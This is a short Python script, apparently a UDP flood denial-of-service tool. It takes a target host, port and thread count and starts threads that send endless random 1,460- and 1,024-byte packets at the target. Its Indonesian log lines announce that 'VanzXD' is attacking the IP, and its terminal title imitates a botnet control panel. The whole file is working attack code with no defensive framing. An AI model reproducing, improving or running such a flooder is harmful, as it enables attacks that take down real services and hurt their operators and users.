import os, sys, time, socket, random, threading

sys.stdout.write("\x1b]2;Exo. | Devices: [1] | Running Attacks [1] | Server Units [8] | Clients: [18]\x07")
host = str(sys.argv[1])
port = int(sys.argv[2])
times = int(sys.argv[3])
threads = int(sys.argv[4])
ip = socket.gethostbyname(host)
os.system('cls' if os.name == 'nt' else 'clear')
print(f"[LOGS] VanzXD MENYERANG IP {host}:{port} DENGAN WAKTU {times}")
time.sleep(2)
print(f"[LOGS] VanzXD MENYERANG IP {host}:{port} DENGAN WAKTU {times}")
time.sleep(2)
print(f"[LOGS] VanzXD MENYERANG IP {host}:{port} DENGAN WAKTU {times}")

        
def run():
    data = random._urandom(1460)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(50000):
                s.sendto(data,addr)
        except:
            s.close()

def run2():
    data = random._urandom(1024)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(50000):
                s.sendto(data,addr)
        except:
            s.close()

for y in range(threads):
    threading.Thread(target=run).start()
    threading.Thread(target=run2).start()